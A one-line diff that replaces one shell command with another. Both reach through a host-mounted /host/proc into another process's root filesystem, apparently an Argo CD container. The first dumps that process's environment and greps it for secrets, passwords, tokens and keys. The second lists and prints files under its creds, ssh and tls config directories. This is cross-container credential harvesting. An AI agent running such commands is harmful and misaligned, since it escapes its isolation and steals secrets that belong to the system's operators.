@@ -1,1 +1,1 @@
-R=/host/proc/156886/root; cat /host/proc/156886/environ 2>/dev/null | tr "\0" "\n" | grep -iE "secret|pass|token|key|url" | head -15; echo "=== FS ==="; ls $R/app 2>/dev/null | head; ls $R/ 2>/dev/null | head -15; ls $R/argo-cd 2>/dev/null | head -10
+R=/host/proc/156886/root; ls $R/app/config 2>/dev/null; echo ---ssh---; ls $R/app/config/ssh 2>/dev/null && cat $R/app/config/ssh/ssh_known_hosts 2>/dev/null | head -5; echo ---creds---; ls $R/app/config/creds 2>/dev/null && head -c 300 $R/app/config/creds/* 2>/dev/null; echo; echo ---tls---; ls $R/app/config/tls 2>/dev/null
